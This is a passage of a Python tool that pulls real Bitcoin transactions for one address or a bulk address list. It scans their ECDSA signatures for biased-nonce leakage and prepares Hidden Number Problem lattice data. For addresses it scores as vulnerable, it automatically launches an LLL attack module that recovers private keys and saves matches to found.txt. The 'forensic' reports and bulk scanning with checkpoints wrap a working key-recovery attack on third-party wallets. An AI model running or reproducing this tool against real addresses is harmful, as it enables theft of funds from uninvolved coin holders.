            flags.append(
                f"[TIER-2] LSB hint: b={r['b']} bits | "
                f"consistency={r['consistency']:.1%} | "
                f"{r['strength_ratio']}x above random"
            )

    # MSB scoring
    for r in msb_results:
        if r['signal'] == 'STRONG':
            score += 30
            best_msb = r
            flags.append(
                f"[TIER-1] MSB leak: b={r['b']} bits | "
                f"fraction={r['best_fraction']:.1%} | "
                f"d_msb_guess={r['d_partial_msb']} | "
                f"{r['strength_ratio']}x above random"
            )
        elif r['signal'] == 'MEDIUM':
            score += 12
            if best_msb is None:
                best_msb = r
            flags.append(
                f"[TIER-2] MSB hint: b={r['b']} bits | "
                f"fraction={r['best_fraction']:.1%} | "
                f"{r['strength_ratio']}x above random"
            )

    # Tier-3 supplementary — Fix 4: max score capped at 5 (weak evidence only)
    if bit_stats['max_bias'] > 0.30:
        add = min(5, int(bit_stats['max_bias'] * 15))   # FIX 4: was min(10, *30)
        score += add
        flags.append(
            f"[TIER-3] Bit-distribution bias: max={bit_stats['max_bias']:.1%} | "
            f"{len(bit_stats['biased_bits'])} bit(s) biased (supplementary, +{add} pts)"
        )

    # Cross-depth + mod-N verification (existing Fix 5)
    verified = _verify_partial_key(lsb_results, group_sigs)
    if verified['cross_depth_ok']:
        score = min(100, score + 10)
        flags.append(
            f"[VERIFY] Cross-depth consistent: d partial matches at depths "
            f"{verified['consistent_depths']} (+10 score)"
        )
    if verified['mod_n_matches'] > 0:
        v_rate = verified['mod_n_matches'] / max(verified['total_sigs'], 1)
        score  = min(100, score + 5)
        flags.append(
            f"[VERIFY] mod-N check: {verified['mod_n_matches']}/{verified['total_sigs']} "
            f"sigs ({v_rate:.0%}) satisfy s·k_lsb ≡ z + r·d (mod 2^b) (+5)"
        )

    # FINAL STAGE: Full k reconstruction + bit validation + ECDSA proof
    recon = _reconstruct_verify(lsb_results, group_sigs)
    if recon['verdict'] == 'CONFIRMED':
        score = min(100, score + 15)
        flags.append(
            f"[PROOF] k reconstruction CONFIRMED: "
            f"{recon['bit_match']}/{recon['reconstructed']} sigs "
            f"have correct k bits (match={recon['match_rate']:.0%}, "
            f"noise={recon['noise_rate']:.0%}) (+15)"
        )
        if recon['example_k']:
            flags.append(
                f"[PROOF] Example k (partial): 0x{recon['example_k'] % (1 << recon['b']):0{recon['b'] // 4}x} "
                f"(low {recon['b']} bits of reconstructed nonce)"
            )
    elif recon.get('verdict') == 'LIKELY':
        score = min(100, score + 8)
        flags.append(
            f"[PROOF] k reconstruction LIKELY: "
            f"{recon.get('bit_match',0)}/{recon.get('reconstructed', recon.get('total_usable',0))} sigs match (+8)"
        )
    elif recon.get('verdict') == 'WEAK':
        flags.append(
            f"[PROOF] k reconstruction WEAK: "
            f"{recon.get('bit_match',0)}/{recon.get('reconstructed', recon.get('total_usable',0))} sigs match "
            f"(noise={recon.get('noise_rate',0.0):.0%}) — possible mixed data"
        )


    # Noise warning
    if recon['noise_rate'] > 0.50 and recon['total_usable'] >= 5:
        flags.append(
            f"[WARN] High noise rate {recon['noise_rate']:.0%} — "
            f"possible mixed keys in group or weak signal"
        )

    score = min(100, score)

    if   score >= 60: verdict = 'VULNERABLE'
    elif score >= 30: verdict = 'SUSPICIOUS'
    else:             verdict = 'CLEAN'

    return {
        'pubkey'          : pubkey,
        'n_sigs'          : n,
        'verdict'         : verdict,
        'score'           : score,
        'flags'           : flags,
        'lsb_results'     : lsb_results,
        'msb_results'     : msb_results,
        'bit_stats'       : bit_stats,
        'best_lsb'        : best_lsb,
        'best_msb'        : best_msb,
        'verification'    : verified,
        'reconstruction'  : recon,
        'merge'           : merge,
        'filter_note'     : filter_note,
        '_clean_sigs'     : clean_sigs,
    }


def analyze_all_groups(sigs: list) -> list:
    """
    Group all sigs by pubkey, analyze each group with >= MIN_GROUP_SIGS sigs.
    Returns list of group analysis dicts.
    """
    groups  = group_by_pubkey(sigs)
    results = []
    skipped = 0

    for pubkey, group_sigs in groups.items():
        if len(group_sigs) < MIN_GROUP_SIGS:
            skipped += 1
            continue
        results.append(analyze_group(pubkey, group_sigs))

    if skipped:
        print(f"    - Groups skipped (< {MIN_GROUP_SIGS} sigs) : {skipped}")
    return results


def build_hnp_lattice_rows(sigs: list) -> list:
    """Build (t_i, u_i) rows for HNP lattice. k_i = t_i*d + u_i mod N"""
    rows = []
    for sig in sigs:
        si  = modinv(sig['s'])
        t_i = (sig['r'] * si) % N
        u_i = (sig['z'] * si) % N
        rows.append((t_i, u_i))
    return rows


# ═══════════════════════════════════════════════════════════════════════════
#  LLL ATTACK ENGINE  ─ delegated to lll.py CRYPTOGRAPHYTUBE
#  Triggered automatically when verdict == VULNERABLE
# ═══════════════════════════════════════════════════════════════════════════


# ── Make lll.py importable from the script's own folder (works regardless of cwd) ──
import sys as _sys
_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
if _SCRIPT_DIR not in _sys.path:
    _sys.path.insert(0, _SCRIPT_DIR)

try:
    import lll as _lll_module
    _LLL_AVAILABLE = True
except ImportError:
    _LLL_AVAILABLE = False



def try_lll_attack(address: str, group_sigs: list, group_dir: str) -> list:
    """
    Wrapper: extract (r,s,z) from forensic sig dicts and call lll.run_lll_attack().
    Returns list of matched 'addr_c:addr_u:privkey_hex' strings.
    """
    if not _LLL_AVAILABLE:
        print(color("    [LLL] lll.py not found — place lll.py in the same folder.", YELLOW))
        return []

    rsz_list = [(sig['r'], sig['s'], sig['z']) for sig in group_sigs]
    if not rsz_list:
        print(color("    [LLL] No signatures to attack.", YELLOW))
        return []

    return _lll_module.run_lll_attack(address, rsz_list, output_dir=group_dir)



# ═══════════════════════════════════════════════════════════════════════════
#  RESULT WRITER CRYPTOGRAPHYTUBE
# ═══════════════════════════════════════════════════════════════════════════

def save_group_results(address: str, grp: dict):
    """
    Save full analysis for one pubkey group to results/address/pubkey_<short>/ folder.
    """
    pubkey    = grp['pubkey']
    short_pk  = pubkey[:16]
    group_dir = os.path.join("results", address, f"pubkey_{short_pk}")
    os.makedirs(group_dir, exist_ok=True)
    sigs      = grp.get('_clean_sigs') or grp['_sigs']   # prefer filtered sigs
    best_lsb  = grp.get('best_lsb')
    best_msb  = grp.get('best_msb')
    merge     = grp.get('merge', {'found': False})
    recon     = grp.get('reconstruction', {})

    # ── vuln_info.txt ────────────────────────────────────────────────────────
    with open(os.path.join(group_dir, "vuln_info.txt"), "w", encoding='utf-8') as f:
        f.write("=" * 64 + "\n")
        f.write("  ECDSA FORENSIC REPORT\n")
        f.write("  Channel : CRYPTOGRAPHYTUBE\n")
        f.write("  Author  : sisujhon\n")
        f.write("=" * 64 + "\n")
        f.write(f"Address         : {address}\n")
        f.write(f"Public Key      : {pubkey}\n")
        f.write(f"Verdict         : {grp['verdict']}\n")
        f.write(f"Score           : {grp['score']} / 100\n")
        f.write(f"Signatures      : {grp['n_sigs']}\n")
        f.write("\n--- LSB LEAKAGE DETAIL ---\n")
        if best_lsb:
            f.write(f"Best bit depth  : {best_lsb['b']} bit(s)\n")
            f.write(f"d mod {1 << best_lsb['b']:5d}    : {best_lsb['d_partial']}\n")
            f.write(f"Consistency     : {best_lsb['consistency']:.1%} ({best_lsb['count']}/{best_lsb['usable']} sigs agree)\n")
            f.write(f"Expected random : {best_lsb['expected_rand']:.4%}\n")
            f.write(f"Strength ratio  : {best_lsb['strength_ratio']}x above random\n")
        else:
            f.write("  No LSB leakage detected.\n")
        f.write("\n--- MSB LEAKAGE DETAIL ---\n")
        if best_msb:
            f.write(f"Best bit depth  : {best_msb['b']} bit(s)\n")
            f.write(f"d_msb_guess     : {best_msb['d_partial_msb']}\n")
            f.write(f"Fraction < N/2^b: {best_msb['best_fraction']:.1%}\n")
            f.write(f"Expected random : {best_msb['expected_rand']:.4%}\n")
            f.write(f"Strength ratio  : {best_msb['strength_ratio']}x above random\n")
        else:
            f.write("  No MSB leakage detected.\n")
        f.write("\n--- DETECTION FLAGS ---\n")
        for flag in grp['flags']:
            f.write(f"  {flag}\n")
        if not grp['flags']:
            f.write("  None\n")

    # ── per_tx_vuln_detail.txt CRYPTOGRAPHYTUBE ──────────────────────────────────────────────
    with open(os.path.join(group_dir, "per_tx_vuln_detail.txt"), "w", encoding='utf-8') as f:
        f.write("=" * 64 + "\n")
        f.write("  PER-TRANSACTION VULNERABILITY DETAIL\n")
        f.write("  Channel : CRYPTOGRAPHYTUBE\n")
        f.write("  Author  : sisujhon\n")
        f.write("=" * 64 + "\n")
        f.write(f"Address         : {address}\n")
        f.write(f"Public Key      : {pubkey}\n")
        if best_lsb:
            f.write(f"LSB leak        : {best_lsb['b']} bit(s) | d mod {1 << best_lsb['b']} = {best_lsb['d_partial']}\n")
        if best_msb:
            f.write(f"MSB leak        : {best_msb['b']} bit(s) | d_msb_guess = {best_msb['d_partial_msb']}\n")
        f.write("\n")

        for idx, sig in enumerate(sigs, 1):
            si  = modinv(sig['s'])
            t_i = (sig['r'] * si) % N
            u_i = (sig['z'] * si) % N
            # d_candidate for best LSB depth
            d_cand_str = "N/A"
            if best_lsb:
                mod_b  = 1 << best_lsb['b']
                t_mod  = t_i % mod_b
                if t_mod % 2 != 0:
                    try:
                        t_inv_b = pow(t_mod, -1, mod_b)
                        d_cand  = ((-u_i % mod_b) * t_inv_b) % mod_b
                        match   = "MATCH" if d_cand == best_lsb['d_partial'] else "differ"
                        d_cand_str = f"{d_cand} ({match})"
                    except Exception:
                        d_cand_str = "invert_err"
            f.write(f"[TX #{idx}]\n")
            f.write(f"  TXID        : {sig['txid']}\n")
            f.write(f"  Public Key  : {sig['pub']}\n")
            f.write(f"  r           : {hex(sig['r'])}\n")
            f.write(f"  s           : {hex(sig['s'])}\n")
            f.write(f"  z (sighash) : {hex(sig['z'])}\n")
            f.write(f"  HNP t_i     : {hex(t_i)}\n")
            f.write(f"  HNP u_i     : {hex(u_i)}\n")
            f.write(f"  d_candidate : {d_cand_str}\n")
            # LSB bits at various depths
            if best_lsb:
                for b in [1, 2, 4, 8]:
                    if b <= best_lsb['b']:
                        lsb_val = t_i % (1 << b)  # k's LSB proxy via t
                        f.write(f"  k LSB[{b:2d}bit] : {u_i % (1 << b):0{b}b} (u_i mod 2^{b})\n")
            # MSB bits
            if best_msb:
                k_guess = (t_i * best_msb['d_partial_msb'] + u_i) % N
                msb_val = k_guess >> (N.bit_length() - best_msb['b'])
                f.write(f"  k MSB[{best_msb['b']:2d}bit] : {msb_val} (k_guess top bits)\n")
            f.write("\n")

    # ── vulnerable_data.txt CRYPTOGRAPHYTUBE ─────────────────────────────────────────────────
    with open(os.path.join(group_dir, "vulnerable_data.txt"), "w", encoding='utf-8') as f:
        f.write("# TXID | r | s | z | pubkey\n")
        for sig in sigs:
            f.write(f"{sig['txid']} | {hex(sig['r'])} | {hex(sig['s'])} | {hex(sig['z'])} | {sig['pub']}\n")

    # ── hnp_lattice.txt CRYPTOGRAPHYTUBE ─────────────────────────────────────────────────────
    rows = build_hnp_lattice_rows(sigs)
    with open(os.path.join(group_dir, "hnp_lattice.txt"), "w", encoding='utf-8') as f:
        f.write("# t_i (r/s mod N)   u_i (z/s mod N)\n")
        f.write(f"# N = {hex(N)}\n")
        if best_lsb:
            f.write(f"# b = {best_lsb['b']}  (detected LSB leakage depth)\n")
            f.write(f"# d mod {1 << best_lsb['b']} = {best_lsb['d_partial']}  (partial key)\n")
        if merge.get('found'):
            f.write(f"# Multi-depth merge: {merge['note']}\n")
        f.write("\n")
        for t, u in rows:
            f.write(f"{hex(t)} {hex(u)}\n")

    # ── multi_depth_merge.txt CRYPTOGRAPHYTUBE ────────────────────────────────────────────────
    if merge.get('found'):
        with open(os.path.join(group_dir, "multi_depth_merge.txt"), "w", encoding='utf-8') as f:
            f.write("=" * 64 + "\n")
            f.write("  MULTI-DEPTH PARTIAL KEY MERGE\n")
            f.write("  Channel : CRYPTOGRAPHYTUBE  |  Author : sisujhon\n")
            f.write("=" * 64 + "\n")
            f.write(f"Merged {merge['merged_bits']} bits confirmed:\n")
            f.write(f"  d (hex)    : {merge['d_hex']}\n")
            f.write(f"  d (binary) : {merge['d_binary']}\n")
            f.write(f"  k_lsb      : 0x{merge.get('k_lsb_merged', 0) or 0:x}\n")
            f.write(f"  Confirmed depths: {merge['confirmed_list']}\n\n")
            f.write("Per-depth detail:\n")
            for line in merge.get('depth_lines', []):
                f.write(line + "\n")

    # ── k_reconstruction.txt CRYPTOGRAPHYTUBE ─────────────────────────────────────────────────
    if recon.get('status') == 'DONE':
        with open(os.path.join(group_dir, "k_reconstruction.txt"), "w", encoding='utf-8') as f:
            f.write("=" * 64 + "\n")
            f.write("  k RECONSTRUCTION RESULT\n")
            f.write("  Channel : CRYPTOGRAPHYTUBE  |  Author : sisujhon\n")
            f.write("=" * 64 + "\n")
            f.write(f"Verdict         : {recon['verdict']}\n")
            f.write(f"Bit depth used  : b = {recon['b']}\n")
            f.write(f"d_partial (hex) : 0x{recon['d_partial']:x}\n")
            f.write(f"k_lsb           : 0x{recon.get('k_lsb', 0) or 0:x}\n")
            f.write(f"Sigs analyzed   : {recon['total_usable']}\n")
            f.write(f"Bit match       : {recon['bit_match']}  ({recon['match_rate']:.0%})\n")
            f.write(f"Noise sigs      : {recon['noise']}       ({recon['noise_rate']:.0%})\n")
            if recon.get('example_k'):
                mod_b = 1 << recon['b']
                f.write(f"Example k[{recon['b']} LSB]: 0x{recon['example_k'] % mod_b:0{recon['b']//4}x}\n")

    # ── GOD MODE: lattice_attack.sage CRYPTOGRAPHYTUBE ────────────────────────────────────────
    all_sigs = grp.get('_sigs', sigs)   
    sage_path = generate_sage_script(group_dir, all_sigs, best_lsb, merge)

    # ── forensic_params.json (Integration with run_attack.py) CRYPTOGRAPHYTUBE ────────────────
    # We save the best b and k_lsb found during forensic scan.
    params_path = os.path.join(group_dir, "forensic_params.json")
    try:
        final_b     = merge.get('merged_bits') or (best_lsb['b'] if best_lsb else 8)
        final_k_lsb = merge.get('k_lsb_merged') or (best_lsb['k_lsb'] if best_lsb else 0)
        final_d_part = grp.get('d_partial') or (best_lsb['d_partial'] if best_lsb else None)
        
        with open(params_path, 'w') as f_json:
            json.dump({
                "b_list": [final_b],
                "k_lsb": final_k_lsb,
                "d_partial": final_d_part,
                "engine": "ECDSA_FORENSIC_PRO",
                "timestamp": int(time.time())
            }, f_json, indent=4)
    except Exception:
        pass

    # ── SIGNATURES.csv  (auto-built for run_attack.py) CRYPTOGRAPHYTUBE ───────────────────────
    sig_csv_path = os.path.join(group_dir, "SIGNATURES.csv")
    try:
        if _LLL_AVAILABLE:
            rsz_list = [(s['r'], s['s'], s['z']) for s in all_sigs]
            csv_rows = _lll_module.val2_from_rsz(rsz_list)
            with open(sig_csv_path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(csv_rows))
            sig_csv_ok = True
        else:
            sig_csv_ok = False
    except Exception:
        sig_csv_ok = False

    print(f"    => Saved: {group_dir}/")
    files = "vuln_info.txt | per_tx_vuln_detail.txt | vulnerable_data.txt | hnp_lattice.txt"
    if merge.get('found'):
        files += " | multi_depth_merge.txt"
    if recon.get('status') == 'DONE':
        files += " | k_reconstruction.txt"
    if sage_path:
        files += " | lattice_attack.sage"
    if sig_csv_ok:
        files += " | SIGNATURES.csv"

    # ── {address}.txt  (manual input file for lll.py) CRYPTOGRAPHYTUBE ────────────────────────
    lll_input_path = f"{address}.txt"
    try:
        all_sigs_for_lll = grp.get('_sigs', sigs)
        with open(lll_input_path, 'w', encoding='utf-8') as f:
            f.write(f"# LLL Attack Input File\n")
            f.write(f"# Address : {address}\n")
            f.write(f"# PubKey  : {pubkey}\n")
            f.write(f"# Sigs    : {len(all_sigs_for_lll)}\n")
            f.write(f"# Format  : r,s,z  (hex values, one per line)\n")
            f.write(f"# Usage   : python3 lll.py  then enter '{address}.txt'\n")
            f.write("# " + "=" * 60 + "\n")
            for sig in all_sigs_for_lll:
                f.write(f"{hex(sig['r'])},{hex(sig['s'])},{hex(sig['z'])}\n")
        files += f" | {lll_input_path}"
        print(f"    [+] LLL input file saved: {lll_input_path}")
        print(f"        Run: python3 lll.py  → enter file: {lll_input_path}")
    except Exception as e:
        print(f"    [!] Could not save {lll_input_path}: {e}")

    print(f"       {files}")



# ═══════════════════════════════════════════════════════════════════════════
#  ADDRESS AUDIT CRYPTOGRAPHYTUBE
# ═══════════════════════════════════════════════════════════════════════════

def color(text, code): return f"\033[{code}m{text}\033[0m"
RED   = 91; GREEN = 92; YELLOW = 93; CYAN = 96; BOLD = 1


def print_group_result(grp: dict):
    v = grp['verdict']
    s = grp['score']
    pk_short = grp['pubkey'][:32] + "..."
    n = grp['n_sigs']
    
    # Verdict Styling
    if   v == 'VULNERABLE': 
        vstr = color(f" ★ VULNERABLE ★ (Score: {s}/100)", RED)
        border = RED
    elif v == 'SUSPICIOUS': 
        vstr = color(f" SUSPICIOUS (Score: {s}/100)", YELLOW)
        border = YELLOW
    else:                   
        vstr = color(f" CLEAN (Score: {s}/100)", GREEN)
        border = GREEN

    print(f"\n    ╔{'═'*72}╗")
    print(f"    ║ PUBKEY: {pk_short:48} ║")
    print(f"    ║ SIGS  : {n:<10}  VERDICT: {vstr:44}║")
    print(f"    ╠{'═'*72}╣")

    # Show Bit-Lifting Depth (Deep Level Check)
    if grp.get('lsb_results'):
        best = grp.get('best_lsb')
        if best and best['signal'] != 'NONE':
            depth = best['b']
            # Visual bit-lift bar
            bar = "▰" * (depth // 2) + "▱" * (16 - depth // 2)
            print(f"    ║ {color('DEEP BIAS SCAN:', 94)} Depth={depth:2d} bits [{bar}] Success={best['consistency']:.0%}  ║")
            print(f"    ║ {color('PARTIAL KEY  :', 94)} d mod 2^{depth:2d} = {hex(best['d_partial'])} (verified)   ║")
            print(f"    ║ {color('NONCE MODEL  :', 94)} k mod 2^{depth:2d} = {hex(best['k_lsb'])} (fixed offset) ║")
            print(f"    ╠{'─'*72}╣")

    # Detailed Flags
    for flag in grp['flags']:
        icon = "⚡" if "TIER-1" in flag else "⚑"
        print(f"    ║ {icon} {flag[:66]:66} ║")

    if not grp['flags']:
        print(f"    ║ No leakage signals detected in entropy profile.                    ║")
    print(f"    ╚{'═'*72}╝")


def audit_address(address: str, limit: int):
    global TOTAL_SCANNED, TOTAL_FOUND
    TOTAL_SCANNED += 1

    print(f"\n{'─'*68}")
    print(f"  Auditing: {color(address, CYAN)}")
    print(f"{'─'*68}")

    meta     = smart_fetch(f"/address/{address}")
    tx_count = meta.get('chain_stats', {}).get('tx_count', 0) if meta else 0
    to_fetch = min(limit, tx_count) if tx_count > 0 else limit

    # ── Show TX summary before fetching ──────────────────────────────────
    print(f"    - Total TX on-chain     : {color(str(tx_count), CYAN)}")
    print(f"    - TX to fetch (limit)   : {color(str(to_fetch), YELLOW)}")

    sigs    = []
    last_id = None
    fetched = 0

    while fetched < limit:
        path = f"/address/{address}/txs"
        if last_id:
            path += f"/chain/{last_id}"

        # smart_fetch handles rate-limit (429) and internet-down internally
        txs = smart_fetch(path)
        if txs is None:
            print(f"    [!] Fetch failed — retrying in 10s ...         ", end='\r')
            time.sleep(10)
            continue
        if not txs:
            break                               # empty page = end of history

        for tx in txs:
            for i, vin in enumerate(tx.get('vin', [])):
                po = vin.get('prevout') or {}
                if po.get('scriptpubkey_address') != address:
                    continue
                r, s, pub = extract_rs_pub(vin)
                if not (r and s):
                    continue
                is_segwit = bool(vin.get('witness'))
                z = get_z_p2wpkh(tx, i) if is_segwit else get_z_p2pkh(tx, i)
                if z:
                    # Deep pre-check display
                    t_i = (r * modinv(s)) % N
                    u_i = (z * modinv(s)) % N
                    sigs.append({'txid': tx['txid'], 'r': r, 's': s, 'z': z, 'pub': pub})
                    
                    fetched += 1
                    bar_done = int(25 * fetched / max(to_fetch, 1))
                    bar      = "█" * bar_done + "░" * (25 - bar_done)
                    print(f"    - [{bar}] {fetched}/{to_fetch} | r={hex(r)[:10]}.. | s={hex(s)[:10]}.. | z_ok ✓ ", end='\r')
                
            if fetched >= limit:
                break

        if len(txs) < 25:
            break                               # last page reached
        last_id = txs[-1]['txid']               # resume cursor
        time.sleep(0.5)                         # be polite to API

    print(" " * 80, end='\r')
    print(f"    - Fetched               : {color(str(fetched), CYAN)} / {color(str(tx_count), CYAN)} TX")
    print(f"    - Signatures extracted  : {color(str(len(sigs)), BOLD)}")

    if len(sigs) < 2:
        print(f"    - {color('Not enough signatures for analysis (need >= 2)', YELLOW)}")
        return False

    # ── Group by pubkey, analyze each group CRYPTOGRAPHYTUBE ──────────────────────────────
    groups        = group_by_pubkey(sigs)
    total_pubkeys = len(groups)
    print(f"    - Unique pubkeys found  : {color(str(total_pubkeys), CYAN)}")
    print(f"    - Min sigs for analysis : {MIN_GROUP_SIGS}")
    print()

    group_results = analyze_all_groups(sigs)
    found_this    = False

    if not group_results:
        print(f"    {color('No pubkey group has >= ' + str(MIN_GROUP_SIGS) + ' signatures. Increase TX limit.', YELLOW)}")
        return False

    print(f"    Analyzed {len(group_results)} pubkey group(s):")
    for grp in group_results:
        print_group_result(grp)

        if grp['verdict'] in ('VULNERABLE', 'SUSPICIOUS'):
            # Inject the actual sigs for this group before saving
            grp['_sigs'] = groups[grp['pubkey']]
            save_group_results(address, grp)
            TOTAL_FOUND  += 1
            found_this    = True

            # ── LLL ATTACK: triggered when VULNERABLE CRYPTOGRAPHYTUBE ──────────────────────
            if grp['verdict'] == 'VULNERABLE':
                pubkey    = grp['pubkey']
                short_pk  = pubkey[:16]
                group_dir = os.path.join("results", address, f"pubkey_{short_pk}")
                group_sigs_for_lll = groups[grp['pubkey']]
                try:
                    lll_matches = try_lll_attack(address, group_sigs_for_lll, group_dir)
                    if lll_matches:
                        print(color(
                            f"\n    *** MATCH SAVED to found.txt — {len(lll_matches)} key(s) ***",
                            RED
                        ))
                except Exception as lll_err:
                    print(color(f"    [LLL] Unexpected error: {lll_err}", YELLOW))

    return found_this


# ═══════════════════════════════════════════════════════════════════════════
#  CHECKPOINT CRYPTOGRAPHYTUBE
# ═══════════════════════════════════════════════════════════════════════════

def save_checkpoint(i: int):
    with open("checkpoint.txt", "w") as f:
        f.write(str(i))


def load_checkpoint() -> int:
    if os.path.exists("checkpoint.txt"):
        with open("checkpoint.txt") as f:
            return int(f.read().strip())
    return 0


# ═══════════════════════════════════════════════════════════════════════════
#  MAIN CRYPTOGRAPHYTUBE
# ═══════════════════════════════════════════════════════════════════════════

BANNER = """
╔══════════════════════════════════════════════════════════════════════╗
║  HNP/CVP  |  Biased-Nonce LSB Leakage — BIT Detector               ║
║  Methods: Entropy Analysis · Chi-Square Test · HNP Lattice Prep    ║
║                                                                      ║
║  Channel : CRYPTOGRAPHYTUBE                                          ║
║  Author  : sisujhon                                                  ║
╚══════════════════════════════════════════════════════════════════════╝
"""


def main():
    print(BANNER)
    limit = int(input("[?] Max TX to fetch per address (default 200): ").strip() or "200")
    mode  = input("[?] Mode — [1] Single address  [2] Bulk from btc.txt : ").strip()
    start_time = time.time()

    if mode == "1":
        addr = input("[?] Bitcoin address: ").strip()
        audit_address(addr, limit)

    elif mode == "2":
        if not os.path.exists("btc.txt"):
            print("[!] btc.txt not found.")
            sys.exit(1)
        with open("btc.txt") as f:
            addrs = [ln.strip() for ln in f if ln.strip()]
        start = load_checkpoint()
        print(f"[*] Resuming from checkpoint #{start}  ({len(addrs) - start} remaining)")
        for i in range(start, len(addrs)):
            audit_address(addrs[i], limit)
            save_checkpoint(i + 1)
    else:
        print("[!] Invalid mode.")

    elapsed = round(time.time() - start_time, 2)
    print(f"""
{'═'*68}
  FINAL REPORT
  Addresses scanned : {TOTAL_SCANNED}
  Flagged (vuln/suspicious) : {TOTAL_FOUND}
  Time elapsed      : {elapsed}s
{'═'*68}
""")


if __name__ == "__main__":
    main()
